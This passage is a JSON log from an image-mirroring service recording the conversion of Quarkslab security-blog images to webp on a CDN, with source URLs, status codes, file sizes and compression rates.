KB","compressRate":"8.9%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/front.jpg","sourceStatusCode":200,"destWidth":4032,"destHeight":3024,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn45@2020_2/2020/08/25/01-15-10-793_4a85fb96fb5d9b60.webp","sourceBytes":4543880,"destBytes":1068702,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":4002,"convertSpendMs":1218,"createdTime":"2020-08-25 09:15:08","host":"us-025*","referer":"http://blog.quarkslab.com/reverse-engineering-a-vxworks-os-based-router.html","linkMd5ListStr":"24f6ad74a1a22bf2ec938c3de16a5402,24f6ad74a1a22bf2ec938c3de16a5402","githubUser":"myreaderx22","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"4.3 MB","destSize":"1 MB","compressRate":"23.5%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html/resources/2019-12-03-samsung_trustzone_exploitation_part1/on_soc.png","sourceStatusCode":404,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn0@2020_1/404.jpg","sourceBytes":0,"destBytes":0,"feedId":11110,"totalSpendMs":732,"convertSpendMs":0,"createdTime":"2020-08-25 09:15:12","host":"us-032*","referer":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html","linkMd5ListStr":"b2c23f95ebaba9ba1a3e978aafc827d9","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[404],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html/resources/2019-12-03-samsung_trustzone_exploitation_part1/virtual_proc.png","sourceStatusCode":404,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn0@2020_1/404.jpg","sourceBytes":0,"destBytes":0,"feedId":11110,"totalSpendMs":746,"convertSpendMs":0,"createdTime":"2020-08-25 09:15:12","host":"us-023*","referer":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html","linkMd5ListStr":"b2c23f95ebaba9ba1a3e978aafc827d9","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[404],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/strings1.PNG","sourceStatusCode":200,"destWidth":261,"destHeight":795,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn28@2020_2/2020/08/25/01-15-12-486_eebc418b1eb7ce9b.webp","sourceBytes":41909,"destBytes":25292,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1274,"convertSpendMs":12,"createdTime":"2020-08-25 09:15:12","host":"europe-23*","referer":"http://blog.quarkslab.com/reverse-engineering-a-vxworks-os-based-router.html","linkMd5ListStr":"24f6ad74a1a22bf2ec938c3de16a5402","githubUser":"myreaderx23","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"40.9 KB","destSize":"24.7 KB","compressRate":"60.3%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-05-20_playing-around-with-the-fuchsia-operating-system/images/micro.png","sourceStatusCode":200,"destWidth":691,"destHeight":291,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn32@2020_1/2020/08/25/01-15-12-513_9e8663734be29184.webp","sourceBytes":43422,"destBytes":25468,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1327,"convertSpendMs":11,"createdTime":"2020-08-25 09:15:12","host":"europe61*","referer":"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html","linkMd5ListStr":"49a8fa1929e7094fabb72d5aefec1af8","githubUser":"myreaderx3","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"42.4 KB","destSize":"24.9 KB","compressRate":"58.7%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-05-28_ansible/Var_manager_2.png","sourceStatusCode":200,"destWidth":1254,"destHeight":585,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn4@2020_5/2020/08/25/01-15-12-559_d82689ddc2c543f9.webp","sourceBytes":47600,"destBytes":25644,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1357,"convertSpendMs":60,"createdTime":"2020-08-25 09:15:12","host":"europe61*","referer":"http://blog.quarkslab.com/ansible-security-assessment.html","linkMd5ListStr":"c919f76de397f905c0933c5249b3e20c","githubUser":"myreaderx4","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"46.5 KB","destSize":"25 KB","compressRate":"53.9%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-06-30-samsung_trustzone_exploitation-part3/trustlet_exploit_calldriver_s7.png","sourceStatusCode":200,"destWidth":330,"destHeight":211,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn56@2020_2/2020/08/25/01-15-12-966_99eb3a43e813ccd7.webp","sourceBytes":25025,"destBytes":7578,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1556,"convertSpendMs":6,"createdTime":"2020-08-25 09:15:12","host":"us-022*","referer":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html","linkMd5ListStr":"bcc1f00b70596b73ee173cdea133e02f","githubUser":"myreaderx27","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"24.4 KB","destSize":"7.4 KB","compressRate":"30.3%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-05-20_playing-around-with-the-fuchsia-operating-system/images/devhosts.png","sourceStatusCode":200,"destWidth":571,"destHeight":511,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn35@2020_5/2020/08/25/01-15-12-887_6449b99138e7fc54.webp","sourceBytes":54647,"destBytes":26840,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1609,"convertSpendMs":42,"createdTime":"2020-08-25 09:15:12","host":"us-018*","referer":"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html","linkMd5ListStr":"49a8fa1929e7094fabb72d5aefec1af8","githubUser":"myreaderx1","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"53.4 KB","destSize":"26.2 KB","compressRate":"49.1%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/encodings.jpg","sourceStatusCode":200,"destWidth":3866,"destHeight":328,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn100@2020_1/2020/08/25/01-15-12-530_0681ca6487dfb984.webp","sourceBytes":73781,"destBytes":44672,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1481,"convertSpendMs":34,"createdTime":"2020-08-25 09:15:12","host":"europe-23*","referer":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html","linkMd5ListStr":"430ebf87a477d97a275d0e53eefc4064","githubUser":"myreaderx32","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"72.1 KB","destSize":"43.6 KB","compressRate":"60.5%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-03-23_mediatek-cve-2020-0069/wfe_command.png","sourceStatusCode":200,"destWidth":851,"destHeight":494,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn70@2020_5/2020/08/25/01-15-12-800_75ff2dfa552fadff.webp","sourceBytes":33551,"destBytes":52324,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1645,"convertSpendMs":40,"createdTime":"2020-08-25 09:15:12","host":"us-025*","referer":"http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html","linkMd5ListStr":"b5e122d24638afa80a92a8b4e06af637","githubUser":"myreaderx33","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"32.8 KB","destSize":"51.1 KB","compressRate":"156%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/TA_kinibi_format.png","sourceStatusCode":200,"destWidth":1058,"destHeight":308,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn23@2020_5/2020/08/25/01-15-12-649_9efbfe7744b0b9cd.webp","sourceBytes":101605,"destBytes":37954,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1564,"convertSpendMs":28,"createdTime":"2020-08-25 09:15:12","host":"europe65*","referer":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html","linkMd5ListStr":"b2c23f95ebaba9ba1a3e978aafc827d9","githubUser":"myreaderx24","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"99.2 KB","destSize":"37.1 KB","compressRate":"37.4%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/ida_mipsb_warning.PNG","sourceStatusCode":200,"destWidth":523,"destHeight":397,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn12@2020_3/2020/08/25/01-15-12-978_7ab1fbc971c8740e.webp","sourceBytes":21192,"destBytes":18820,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1697,"convertSpendMs":15,"createdTime":"2020-08-25 09:15:12","host":"us-026*","referer":"http://blog.quarkslab.com/reverse-engineering-a-vxworks-os-based-router.html","linkMd5ListStr":"24f6ad74a1a22bf2ec938c3de16a5402","githubUser":"myreaderx16","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"20.7 KB","destSize":"18.4 KB","compressRate":"88.8%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/ida_mipsb_second_try_2.PNG","sourceStatusCode":200,"destWidth":1142,"destHeight":650,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn24@2020_6/2020/08/25/01-15-12-970_8e11cbfd2d09a41e.webp","sourceBytes":105110,"destBytes":104182,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1759,"convertSpendMs":47,"createdTime":"2020-08-25 09:15:12","host":"us-010*","referer":"http://blog.quarkslab.com/reverse-engineering-a-vxworks-os-based-router.html","linkMd5ListStr":"24f6ad74a1a22bf2ec938c3de16a5402","githubUser":"myreaderx16","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"102.6 KB","destSize":"101.7 KB","compressRate":"99.1%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2019-12-10-samsung_trustzone_exploitation_part2/software_stack.png","sourceStatusCode":200,"destWidth":523,"destHeight":334,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn20@2020_6/2020/08/25/01-15-13-074_4b1758cbb145e02e.webp","sourceBytes":50437,"destBytes":20616,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1760,"convertSpendMs":16,"createdTime":"2020-08-25 09:15:12","host":"us-022*","referer":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-2.html","linkMd5ListStr":"67866c8423e15119961fa91dec078a96","githubUser":"myreaderx30","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"49.3 KB","destSize":"20.1 KB","compressRate":"40.9%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/goupix-wb.jpg","sourceStatusCode":200,"destWidth":500,"destHeight":666,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn83@2020_5/2020/08/25/01-15-12-680_a11ce90513902d93.webp","sourceBytes":102810,"destBytes":46572,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1650,"convertSpendMs":35,"createdTime":"2020-08-25 09:15:12","host":"europe-57*","referer":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html","linkMd5ListStr":"430ebf87a477d97a275d0e53eefc4064","githubUser":"myreaderx19","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"100.4 KB","destSize":"45.5 KB","compressRate":"45.3%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/ida_mipsb_first_try.PNG","sourceStatusCode":200,"destWidth":1160,"destHeight":645,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn68@2020_5/2020/08/25/01-15-13-090_5677346e646ff0b3.webp","sourceBytes":61184,"destBytes":78612,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1795,"convertSpendMs":45,"createdTime":"2020-08-25 09:15:12","host":"us-026*","referer":"http://blog.quarkslab.com/reverse-engineering-a-vxworks-os-based-router.html","linkMd5ListStr":"24f6ad74a1a22bf2ec938c3de16a5402","githubUser":"myreaderx12","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"59.8 KB","destSize":"76.8 KB","compressRate":"128.5%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/E_r0.png","sourceStatusCode":200,"destWidth":1899,"destHeight":825,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn11@2020_6/2020/08/25/01-15-12-678_47f80bfbf18c2289.webp","sourceBytes":167964,"destBytes":50444,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1721,"convertSpendMs":71,"createdTime":"2020-08-25 09:15:12","host":"europe-57*","referer":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html","linkMd5ListStr":"430ebf87a477d97a275d0e53eefc4064","githubUser":"myreaderx11","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"164 KB","destSize":"49.3 KB","compressRate":"30%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/tz_archi_lib.png","sourceStatusCode":200,"destWidth":708,"destHeight":491,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn31@2020_3/2020/08/25/01-15-13-214_f4a6f211a773ea80.webp","sourceBytes":103967,"destBytes":34798,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1889,"convertSpendMs":22,"createdTime":"2020-08-25 09:15:12","host":"us-030*","referer":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html","linkMd5ListStr":"b2c23f95ebaba9ba1a3e978aafc827d9","githubUser":"myreaderx2","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"101.5 KB","destSize":"34 KB","compressRate":"33.5%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/tz_archi.png","sourceStatusCode":200,"destWidth":710,"destHeight":496,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn20@2020_3/2020/08/25/01-15-13-145_e0d42c6719fbc10a.webp","sourceBytes":124346,"destBytes":44454,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1899,"convertSpendMs":19,"createdTime":"2020-08-25 09:15:12","host":"us-002*","referer":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html","linkMd5ListStr":"b2c23f95ebaba9ba1a3e978aafc827d9","githubUser":"myreaderx3","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"121.4 KB","destSize":"43.4 KB","compressRate":"35.8%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/read.png","sourceStatusCode":200,"destWidth":1901,"destHeight":802,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn8@2020_6/2020/08/25/01-15-13-265_6d96ee46d0497c0e.webp","sourceBytes":217852,"destBytes":48078,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1986,"convertSpendMs":70,"createdTime":"2020-08-25 09:15:12","host":"us-039*","referer":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html","linkMd5ListStr":"430ebf87a477d97a275d0e53eefc4064","githubUser":"myreaderx30","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"212.7 KB","destSize":"47 KB","compressRate":"22.1%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/secure_driver.png","sourceStatusCode":200,"destWidth":1683,"destHeight":987,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn87@2020_1/2020/08/25/01-15-12-781_1f9316040b850669.webp","sourceBytes":181899,"destBytes":83188,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1916,"convertSpendMs":169,"createdTime":"2020-08-25 09:15:12","host":"europe65*","referer":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html","linkMd5ListStr":"b2c23f95ebaba9ba1a3e978aafc827d9","githubUser":"myreaderx6","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"177.6 KB","destSize":"81.2 KB","compressRate":"45.7%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/stack_write.png","sourceStatusCode":200,"destWidth":1886,"destHeight":800,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn92@2020_2/2020/08/25/01-15-13-325_41d8c7b67f1f7e07.webp","sourceBytes":304357,"destBytes":72232,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":2068,"convertSpendMs":85,"createdTime":"2020-08-25 09:15:12","host":"us-53*","referer":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html","linkMd5ListStr":"430ebf87a477d97a275d0e53eefc4064","githubUser":"myreaderx18","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"297.2 KB","destSize":"70.5 KB","compressRate":"23.7%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2019-12-10-samsung_trustzone_exploitation_part2/coverage_info.png","sourceStatusCode":200,"destWidth":1918,"destHeight":1079,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn28@2020_2/2020/08/25/01-15-13-299_f0fe9a53ae9fe577.webp","sourceBytes":282138,"destBytes":162656,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":2146,"convertSpendMs":139,"createdTime":"2020-08-25 09:15:12","host":"us-53*","referer":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-2.html","linkMd5ListStr":"67866c8423e15119961fa91dec078a96","githubUser":"myreaderx7","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"275.5 KB","destSize":"158.8 KB","compressRate":"57.7%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/rizzo_functions.PNG","sourceStatusCode":200,"destWidth":1208,"destHeight":478,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn79@2020_4/2020/08/25/01-15-13-450_435a459dcac67446.webp","sourceBytes":70122,"destBytes":87900,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":2270,"convertSpendMs":319,"createdTime":"2020-08-25 09:15:12","host":"us-014*","referer":"http://blog.quarkslab.com/reverse-engineering-a-vxworks-os-based-router.html","linkMd5ListStr":"24f6ad74a1a22bf2ec938c3de16a5402","githubUser":"myreaderx31","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"68.5 KB","destSize":"85.8 KB","compressRate":"125.4%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-05-28_ansible/playbook_multiple_user_vuln_p1.png","sourceStatusCode":200,"destWidth":2324,"destHeight":2244,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn64@2020_4/2020/08/25/01-15-12-765_6ba18559c4dbe741.webp","sourceBytes":194239,"destBytes":123786,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":2138,"convertSpendMs":211,"createdTime":"2020-08-25 09:15:12","host":"europe-23*","referer":"http://blog.quarkslab.com/ansible-security-assessment.html","linkMd5ListStr":"c919f76de397f905c0933c5249b3e20c","githubUser":"myreaderx29","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"189.7 KB","destSize":"120.9 KB","compressRate":"63.7%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/AES_new1.png","sourceStatusCode":200,"destWidth":2612,"destHeight":796,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn95@2020_6/2020/08/25/01-15-13-420_cd934934bb6b4eea.webp","sourceBytes":184370,"destBytes":97858,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":2300,"convertSpendMs":226,"createdTime":"2020-08-25 09:15:12","host":"us-030*","referer":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html","linkMd5ListStr":"430ebf87a477d97a275d0e53eefc4064","githubUser":"myreaderx19","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"180 KB","destSize":"95.6 KB","compressRate":"53.1%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-05-28_ansible/execution_plugin_normal_root.png","sourceStatusCode":200,"destWidth":2324,"destHeight":2244,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn4@2020_3/2020/08/25/01-15-13-472_637f0d749c43d1d1.webp","sourceBytes":318082,"destBytes":195240,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":2397,"convertSpendMs":217,"createdTime":"2020-08-25 09:15:12","host":"us-006*","referer":"http://blog.quarkslab.com/ansible-security-assessment.html","linkMd5ListStr":"c919f76de397f905c0933c5249b3e20c","githubUser":"myreaderx8","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"310.6 KB","destSize":"190.7 KB","compressRate":"61.4%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-05-28_ansible/execution_plugin_normal_become.png","sourceStatusCode":200,"destWidth":2324,"destHeight":2244,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn84@2020_4/2020/08/25/01-15-13-455_36faa24f7ffe318c.webp","sourceBytes":315735,"destBytes":195056,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":2451,"convertSpendMs":231,"createdTime":"2020-08-25 09:15:12","host":"us-002*","referer":"http://blog.quarkslab.com/ansible-security-assessment.html","linkMd5ListStr":"c919f76de397f905c0933c5249b3e20c","githubUser":"myreaderx14","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"308.3 KB","destSize":"190.5 KB","compressRate":"61.8%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html/resources/2019-12-03-samsung_trustzone_exploitation_part1/off_soc.png","sourceStatusCode":404,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn0@2020_1/404.jpg","sourceBytes":0,"destBytes":0,"feedId":11110,"totalSpendMs":188,"convertSpendMs":0,"createdTime":"2020-08-25 09:15:14","host":"europe65*","referer":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html","linkMd5ListStr":"b2c23f95ebaba9ba1a3e978aafc827d9","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[404],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/kd_0.png","sourceStatusCode":200,"destWidth":5012,"destHeight":1320,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn43@2020_6/2020/08/25/01-15-13-340_87fa83c3bcacf546.webp","sourceBytes":487066,"destBytes":288370,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":2733,"convertSpendMs":650,"createdTime":"2020-08-25 09:15:12","host":"europe69*","referer":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html","linkMd5ListStr":"430ebf87a477d97a275d0e53eefc4064","githubUser":"myreaderx21","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"475.7 KB","destSize":"281.6 KB","compressRate":"59.2%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/AES.png","sourceStatusCode":200,"destWidth":3132,"destHeight":1296,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn16@2020_1/2020/08/25/01-15-14-129_d23e1f0e0af62f65.webp","sourceBytes":277405,"destBytes":134562,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":2999,"convertSpendMs":879,"createdTime":"2020-08-25 09:15:12","host":"us-014*","referer":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html","linkMd5ListStr":"430ebf87a477d97a275d0e53eefc4064","githubUser":"myreaderx23","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"270.9 KB","destSize":"131.4 KB","compressRate":"48.5%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/images/ow1.PNG","sourceStatusCode":200,"destWidth":523,"destHeight":417,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn44@2020_3/2020/08/25/01-15-14-449_6b5642a7e45d87b6.webp","sourceBytes":63438,"destBytes":35862,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1786,"convertSpendMs":18,"createdTime":"2020-08-25 09:15:13","host":"us-031*","referer":"http://blog.quarkslab.com/reverse-engineering-a-vxworks-os-based-router.html","linkMd5ListStr":"24f6ad74a1a22bf2ec938c3de16a5402","githubUser":"myreaderx7","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"62 KB","destSize":"35 KB","compressRate":"56.5%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/AES7.png","sourceStatusCode":200,"destWidth":6364,"destHeight":1472,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn91@2020_4/2020/08/25/01-15-14-036_64e91f616bf075ef.webp","sourceBytes":405255,"destBytes":347122,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":3089,"convertSpendMs":832,"createdTime":"2020-08-25 09:15:12","host":"us-022*","referer":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html","linkMd5ListStr":"430ebf87a477d97a275d0e53eefc4064","githubUser":"myreaderx13","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"395.8 KB","destSize":"339 KB","compressRate":"85.7%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2020-06-30-samsung_trustzone_exploitation-part3/secure_driver_vuln_memcpy_s7.png","sourceStatusCode":200,"destWidth":741,"destHeight":781,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn47@2020_1/2020/08/25/01-15-14-404_5010c94271b208f4.webp","sourceBytes":127337,"destBytes":44488,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1695,"convertSpendMs":31,"createdTime":"2020-08-25 09:15:13","host":"us-022*","referer":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html","linkMd5ListStr":"bcc1f00b70596b73ee173cdea133e02f","githubUser":"myreaderx2","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"124.4 KB","destSize":"43.4 KB","compressRate":"34.9%"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/resources/2019-12-03-samsung_trustzone_exploitation_part1/sboot_archi.png","sourceStatusCode":200,"destWidth":681,"destHeight":501,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn51@2020_3/2020/08/25/01-15-14-358_1d6a49ffa5d43c09.webp","sourceBytes":86399,"destBytes":41248,"targetWebpQuality":75,"feedId":11110,"totalSpendMs":1649,"convertSpendMs":43,"createdTime":"2020-08-25 